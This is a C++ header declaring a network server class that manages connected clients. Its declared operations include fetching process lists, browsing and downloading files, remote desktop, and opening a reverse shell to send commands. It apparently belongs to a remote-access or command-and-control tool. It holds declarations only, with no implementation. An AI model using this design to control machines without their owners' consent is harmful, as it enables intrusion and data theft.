#pragma once
// #include "NetClientService.h"
#include "../../../shared/NetLib/services/BaseNetService.h"
#include "../UuidService.h"
#include <map>
#include <queue>
#include <condition_variable>

class Application;
class Client;
class Mutex;
// #include "Logger.h"
class NetClientService;
struct NetError;
class Packet;
class Thread;

class NetServerService : public BaseNetService
{
public:

	NetServerService(Application* app);
	~NetServerService();
	void startSendPacketsLoopAsync();
	void start();

	NetError* getErrorOnBind();

	SOCKET createTCPServer(unsigned short port);

	// NetServerService(int port);

	void listenForClients();
	// NetClientService* getClientByUuid(UUID* uuid);
	void loopPacketsQueue();
	void sendPacketAsync(Packet* packet);
	void onError(NetError* appError);
	std::map<SOCKET, NetClientService*> getClientsMap();
	std::vector<Client*> getClients();
	std::vector<NetClientService*>::size_type getClientsCount();
	void onPacketReceived(Client* client, Packet* packet);
	void onClientDisconnected(Client* client);
	Client* getClient(unsigned long long clientId);
	void queuePacket(Packet* packet, unsigned long long clientId);
	void requestProcessList(Client* client);
	void listFiles(Client* client, const std::wstring& path);
	void downloadFile(Client* client, const std::wstring& path);
	void startRemoteDesktop(Client* client);
	void requestReverseShell(Client* client);
	void sendShellCommand(Client* client, std::string& instruction);


private:
	// std::vector<std::shared_ptr<NetClientService>> clients;
	std::map<SOCKET, NetClientService*> clients;
	// std::mutex clientsMutex;
	// Mutex* clientsMutex;
	// LoggingService* logger;
	int port;

	// boost::uuids::random_generator uuidGenerator;

	hostent* addrResolved;

	std::queue<Packet*> packetsToBeSent;
	Thread* packetSendThread;
	UuidService* uuidService;
	bool running;

	struct sockaddr_in serverAddress;

	std::condition_variable cv;
	std::mutex outPacketsMutex;

	Application* application;

	SRWLOCK clientsLock;
};
